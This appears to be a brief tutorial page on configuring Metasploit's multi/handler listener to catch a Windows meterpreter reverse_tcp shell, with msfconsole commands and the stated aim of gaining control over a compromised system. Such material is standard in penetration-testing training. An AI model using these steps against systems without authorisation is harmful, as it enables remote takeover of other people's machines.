Configuring `multi/handler` in Metasploit

Setting up your listener to receive incoming connections.

Load Module: Start `msfconsole` and use `use exploit/multi/handler`.

Configure: Set `PAYLOAD`, `LHOST`, and `LPORT` to match your `msfvenom` payload settings.

Verify & Start: Use `show options` to check, then `exploit` to start the listener.

Key Takeaway

A correctly configured `multi/handler` is essential for receiving connections and establishing control over a compromised system.

kali@attacker:~
# Launch msfconsole
user@kali:~$ msfconsole

# Configure the handler
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST <YOUR_KALI_IP>
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > show options

# Example output of show options (truncated)

Important Note

The `exploit` command will start the listener, waiting for the target to connect back.
